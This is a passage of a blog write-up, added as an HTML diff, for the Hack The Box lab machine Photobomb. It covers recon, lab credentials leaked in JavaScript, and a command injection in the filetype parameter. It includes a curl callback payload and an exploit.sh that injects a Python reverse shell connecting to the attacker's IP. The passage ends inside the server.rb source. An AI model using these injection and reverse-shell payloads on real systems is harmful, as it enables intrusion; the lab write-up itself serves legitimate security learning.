@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Retired From Hack The Box - Medium Machine - 0xh41 | Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Photobomb HTB machine writeup" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Retired From Hack The Box - Medium Machine" />
+<meta property="og:description" content="Photobomb HTB machine writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hassan-al-achek.github.io/posts/photobomb-htb-machine/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-15T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-15T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Retired From Hack The Box - Medium Machine"/>
+<meta name="twitter:description" content="Photobomb HTB machine writeup"/>
+<script src="https://hassan-al-achek.github.io/js/feather.min.js"></script>
+	
+	
+        <link href="https://hassan-al-achek.github.io/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://hassan-al-achek.github.io/css/main.dcdce5d0c876e01eff6576e36e0eaf7dac6d2941cbe7cd1770b52e1288fd3212.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://hassan-al-achek.github.io/css/dark.19b9457bc32f3649f4646b44ab3d6445ba73f43a15cd0763d01e18bc77eb5bbf.css"  disabled />
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://hassan-al-achek.github.io/">0xh41 | Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://hassan-al-achek.github.io/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Retired From Hack The Box - Medium Machine</h1>
+			<div class="meta">Posted on Dec 15, 2022</div>
+		</div>
+		
+		<div class="tldr">
+			<strong>tl;dr:</strong>
+			Exploiting Command injection vuln to gain access to the machine then exploiting a script that we can run as root without password to gain root access.
+		</div>
+
+		<section class="body">
+			<h1 id="recon">Recon:</h1>
+<h2 id="nmap-scan">Nmap Scan:</h2>
+<h3 id="quick-nmap-scan">Quick Nmap Scan:</h3>
+<ul>
+<li>Open Ports: 80 (http) - 22 (ssh)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ export IP<span style="color:#f92672">=</span>10.10.11.182
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ nmap $IP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-15 05:59 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.182
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.022s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.50 seconds
+</span></span></code></pre></div><h3 id="nmap-full-scan">Nmap Full Scan:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ nmap -p- $IP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-15 06:01 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.182
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.024s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.12 seconds
+</span></span></code></pre></div><h3 id="nmap-services-version-fingerprinting">Nmap Services Version Fingerprinting:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ nmap -p80,22 -sV -sC $IP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-15 06:02 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.182
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.022s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> e22473bbfbdf5cb520b66876748ab58d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 04e3ac6e184e1b7effac4fe39dd21bae <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 20e05d8cba71f08c3a1819f24011d29e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://photobomb.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.72 seconds
+</span></span></code></pre></div><ul>
+<li>Let&rsquo;s add <code>photobomb.htb</code> to our <code>/etc/hosts</code> file:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@exploitation:/home/goku<span style="color:#ae81ff">\#</span> echo <span style="color:#e6db74">&#34;10.10.11.182 photobomb.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><h2 id="recon-web-application---port-80-http">Recon: Web application - Port 80 (http)</h2>
+<ul>
+<li>Main page:</li>
+</ul>
+<p><img src="/Pasted-image-20221215060938.png" alt="Image alt"></p>
+<ul>
+<li>Web Tech Stack:</li>
+</ul>
+<p><img src="/Pasted-image-20221215070211.png" alt="Image alt"></p>
+<ul>
+<li>
+<p>Main page source page:</p>
+<ul>
+<li>Intersting message:</li>
+</ul>
+<blockquote>
+<p>To get started, please click here! (the credentials are in your welcome pack).</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/Pasted-image-20221215061346.png" alt="Image alt"></p>
+<ul>
+<li>Click here will take you to an new Endpoint: <code>/printer</code></li>
+<li>From the page source code we can discover a custom javascript file <code>photobomb.js</code> ! Intersting!. Let&rsquo;s examine it!</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// photobomb.js content
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">init</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/</span>)
+</span></span><span style="display:flex;"><span>  ) {
+</span></span><span style="display:flex;"><span>    document
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">getElementsByClassName</span>(<span style="color:#e6db74">&#34;creds&#34;</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;href&#34;</span>, <span style="color:#e6db74">&#34;http://pH0t0:b0Mb!@photobomb.htb/printer&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">init</span>;
+</span></span></code></pre></div><ul>
+<li>
+<p><code>/printer</code> endpoint:</p>
+<ul>
+<li>Login Needed</li>
+</ul>
+</li>
+</ul>
+<p><img src="/Pasted-image-20221215062312.png" alt="Image alt"></p>
+<ul>
+<li>From the <code>photbomb.js</code>:
+<ul>
+<li>We can find valide credentials as the following message state:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>document
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">getElementsByClassName</span>(<span style="color:#e6db74">&#34;creds&#34;</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;href&#34;</span>, <span style="color:#e6db74">&#34;http://pH0t0:b0Mb!@photobomb.htb/printer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Username: pH0t0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Password: b0Mb!
+</span></span></span></code></pre></div><ul>
+<li>After login to the <code>/printer</code>:</li>
+</ul>
+<p><img src="/Pasted-image-20221215063041.png" alt="Image alt"></p>
+<ul>
+<li>You can here choose a photo to download, the photo&rsquo;s quality, the photo&rsquo;s type (png or jpg) and then click the download button</li>
+<li>Let&rsquo;s fire up burpsuite and intercept this request\</li>
+</ul>
+<p><img src="/Pasted-image-20221215063530.png" alt="Image alt"></p>
+<ul>
+<li>The Download HTTP requets:</li>
+</ul>
+<p><img src="/Pasted-image-20221215064122.png" alt="Image alt"></p>
+<ul>
+<li>
+<p>After Anlysing the web application:</p>
+<ul>
+<li>The web application does not use a database. Photos are hard-coded inside the html code</li>
+<li>The Web application performs image conversion behind the scene from jpg to png - based on the <code>filetype</code> parameter</li>
+</ul>
+</li>
+<li>
+<p>If we submit an unknown filetype, we will get the following error:</p>
+</li>
+</ul>
+<p><img src="/Pasted-image-20221215071935.png" alt="Image alt"></p>
+<ul>
+<li>I tried arbitray files from the server but i get the following error <code>Invalid photo.</code></li>
+<li>As we said before the web application performs some kind of conversion, so i decided to test for command injection vulnerability.</li>
+<li>I tested the 3 parameters. But, only the <code>filetype</code> was injectable with a blind command injection.</li>
+</ul>
+<h3 id="verifying-the-blind-command-injection-vulnerability">Verifying the blind command injection vulnerability:</h3>
+<ul>
+<li>Start a local http server:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal 1</span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ python -m http.server <span style="color:#ae81ff">8088</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8088</span> <span style="color:#f92672">(</span>http://0.0.0.0:8088/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>Insert the following payload into the <code>filetype</code> parameter:
+Payload: <code>jpg;curl http://10.10.14.2:8088</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Teminal 2</span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ curl -X POST -H <span style="color:#e6db74">&#34;Authorization: Basic cEgwdDA6YjBNYiE=&#34;</span> -d <span style="color:#e6db74">&#34;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;curl http://10.10.14.2:8088&amp;dimensions=600x400&#34;</span> http://photobomb.htb/printer
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$
+</span></span></code></pre></div><ul>
+<li>An HTTP request received from the <code>photobomb</code> remote machine:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal 1</span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ python -m http.server <span style="color:#ae81ff">8088</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8088</span> <span style="color:#f92672">(</span>http://0.0.0.0:8088/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.10.11.182 - - <span style="color:#f92672">[</span>15/Dec/2022 07:30:35<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><h2 id="getting-foothold-user-flag-exploiting-the-command-injection-vulnerability">Getting foothold (User flag): Exploiting the command injection vulnerability</h2>
+<ul>
+<li>A simple bash script to exploity the vuln automatically:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># exploit.sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the Machine IP</span>
+</span></span><span style="display:flex;"><span>IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip a s tun0 | grep -o <span style="color:#e6db74">&#39;[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Python reverse shell</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Bulding the Payload&#34;</span>
+</span></span><span style="display:flex;"><span>CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;</span>$IP<span style="color:#e6db74">\&#34;,</span>$PORT<span style="color:#e6db74">));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\&#34;/bin/sh\&#34;)&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start netcat listner on the background</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Listning at </span>$IP<span style="color:#e6db74">:</span>$PORT<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nohup nc -dlvp &#34;$PORT&#34; &amp;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit</span>
+</span></span><span style="display:flex;"><span>curl -X POST -H <span style="color:#e6db74">&#34;Authorization: Basic cEgwdDA6YjBNYiE=&#34;</span> -d <span style="color:#e6db74">&#34;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;</span>$CMD<span style="color:#e6db74">&amp;dimensions=600x400&#34;</span> <span style="color:#e6db74">&#34;http://photobomb.htb/printer&#34;</span> &amp;&gt;/dev/null <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[+] Pwned!&#34;</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[+] Here is your shell&#34;</span> <span style="color:#75715e"># &amp;&amp; fg %+</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal 1</span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ ./exploit.sh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bulding the Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listning at 10.10.14.2:4444
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Pwned!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Here is your shell
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal 2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connection received</span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ nc -lvp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.2<span style="color:#f92672">]</span> from photobomb.htb <span style="color:#f92672">[</span>10.10.11.182<span style="color:#f92672">]</span> <span style="color:#ae81ff">53292</span>
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>wizard
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>log  photobomb.sh  public  resized_images  server.rb  source_images
+</span></span><span style="display:flex;"><span>$ cd /home/wizard
+</span></span><span style="display:flex;"><span>cd /home/wizard
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>photobomb  user.txt
+</span></span></code></pre></div><h3 id="upgrade-legacy-shell-to-interactive-shell">Upgrade legacy shell to interactive shell:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># In reverse shell</span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ nc -lvp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.2<span style="color:#f92672">]</span> from photobomb.htb <span style="color:#f92672">[</span>10.10.11.182<span style="color:#f92672">]</span> <span style="color:#ae81ff">42836</span>
+</span></span><span style="display:flex;"><span>$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>wizard@photobomb:~/photobomb$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ctrl-Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In Kali</span>
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ stty raw -echo
+</span></span><span style="display:flex;"><span>goku@exploitation:~$ fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In reverse shell</span>
+</span></span><span style="display:flex;"><span>wizard@photobomb:~/photobomb$ reset
+</span></span><span style="display:flex;"><span>wizard@photobomb:~/photobomb$ export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>wizard@photobomb:~/photobomb$ export TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span><span style="display:flex;"><span>wizard@photobomb:~/photobomb$ stty rows <span style="color:#ae81ff">38</span> columns <span style="color:#ae81ff">116</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wizard@photobomb:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>wizard<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>wizard<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>wizard<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>wizard@photobomb:~$ <span style="color:#75715e"># Amazing full tty shell</span>
+</span></span></code></pre></div><h3 id="the-vulnerability-root-cause">The vulnerability root cause:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># server.rb</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;sinatra&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set <span style="color:#e6db74">:public_folder</span>, <span style="color:#e6db74">&#39;public&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  html <span style="color:#f92672">=</span> <span style="color:#f92672">&lt;&lt;~</span><span style="color:#66d9ef">HTML</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#66d9ef">DOCTYPE</span> html<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>head<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span>title<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">Photobomb</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;link type=&#34;text/</span>css<span style="color:#e6db74">&#34; rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>styles<span style="color:#f92672">.</span>css<span style="color:#e6db74">&#34; media=&#34;</span>all<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;script src=&#34;</span>photobomb<span style="color:#f92672">.</span>js<span style="color:#e6db74">&#34;&gt;&lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;div id=&#34;</span>container<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;header&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;h1&gt;&lt;a href=&#34;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#34;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/header&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;article&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;p&gt;To get started, please &lt;a href=&#34;</span><span style="color:#f92672">/</span>printer<span style="color:#e6db74">&#34; class=&#34;</span>creds<span style="color:#e6db74">&#34;&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/article&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTML
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  content_type :html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  return html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">get &#39;/printer&#39; do
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  images = &#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  checked = &#39; checked=&#34;</span>checked<span style="color:#e6db74">&#34; &#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Dir.glob(&#39;public/ui_images/*.jpg&#39;) do |jpg_filename|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    img_src = jpg_filename.sub(&#39;public/&#39;, &#39;&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    img_name = jpg_filename.sub(&#39;public/ui_images/&#39;, &#39;&#39;)
